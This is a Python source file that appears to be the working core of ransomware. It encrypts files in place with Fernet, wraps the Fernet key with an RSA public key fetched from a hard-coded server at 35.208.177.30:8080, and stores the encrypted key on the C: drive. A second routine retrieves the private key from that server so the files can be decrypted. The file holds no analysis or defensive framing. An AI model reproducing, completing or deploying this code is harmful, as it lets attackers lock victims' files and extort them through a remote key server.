from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend
import os
import re
import requests
from config import *

def encrypt(key,file):
    f=Fernet(key)
    if os.path.basename(file) not in keys:
        with open(file, "rb") as file_data:
            file_data = file_data.read()

        encrypted_data = f.encrypt(file_data)

        with open(file, "wb") as file:
            file.write(encrypted_data)

def decrypt(key,file):
    f = Fernet(key)
    if os.path.basename(file) != 'key1029384756.key':
        with open(file, "rb") as file_data:
            file_data = file_data.read()

        encrypted_data = f.decrypt(file_data)

        with open(file, "wb") as file:
            file.write(encrypted_data)

def decrypt_by_private_key(private_key):
    key=private_key
    key = key.replace("-----BEGIN PRIVATE KEY-----", "")
    key = key.replace("-----END PRIVATE KEY-----", "")
    key = re.sub("(.{64})", "\\1\n", key, 0, re.DOTALL)
    key = "-----BEGIN PRIVATE KEY-----\n" + key
    key = key + "\n-----END PRIVATE KEY-----"
    #with open(f"C:/{dir_name}/{private_key_name}",'w') as key_file:
    #        key_file.write(key)
            
    #print(key)
    key = serialization.load_pem_private_key(bytes(key.encode('UTF-8')), password=None, backend=default_backend())
    key_to_decrypt = open(f'C:/{dir_name}/{key_name}', 'rb').read()
    print(key_to_decrypt)
    print(type(key_to_decrypt))
    plaintext = key.decrypt(
        key_to_decrypt,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
       ))
    print(plaintext)
    print(key)
    return plaintext
	
def create_key(public_key):
    key = Fernet.generate_key()
    print(key)
    encrypted_key= public_key.encrypt(
                    key,
                    padding.OAEP(
                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    ))
    print(encrypted_key)
    print(type(encrypted_key))
	
    with open(f"C:/{dir_name}/{key_name}",'wb') as key_file:
        key_file.write(encrypted_key)
    return key
    
def get_public_key():
    try:
        response=requests.get('http://35.208.177.30:8080', timeout=10)
    except:
        exit()
    print(response.status_code)

    if response.status_code==200:
        time=response.json()['time']
        public_key=response.json()['public_key']
        public_key = public_key.replace("-----BEGIN PUBLIC KEY-----", "")
        public_key = public_key.replace("-----END PUBLIC KEY-----", "")
        public_key = re.sub("(.{64})", "\\1\n", public_key, 0, re.DOTALL)
        public_key = "-----BEGIN PUBLIC KEY-----\n" + public_key
        public_key = public_key + "\n-----END PUBLIC KEY-----"

        with open(f"C:/{dir_name}/{public_key_name}",'w') as key_file:
            key_file.write(public_key)

        public_key = serialization.load_pem_public_key(bytes(public_key.encode('UTF-8')))
        
        return public_key, time
        
def get_private_key():

    with open(f"C:/{dir_name}/{public_key_name}", "r") as key_file:
                    public_key=str(key_file.read()).replace("\n","")
    
    response=requests.get(f'http://35.208.177.30:8080/private_key', 
                        json={"public_key": public_key})
    if response.status_code==400:
        return 400, None
    elif response.status_code==200:
        private_key=response.json()['private_key']
        return 200, private_key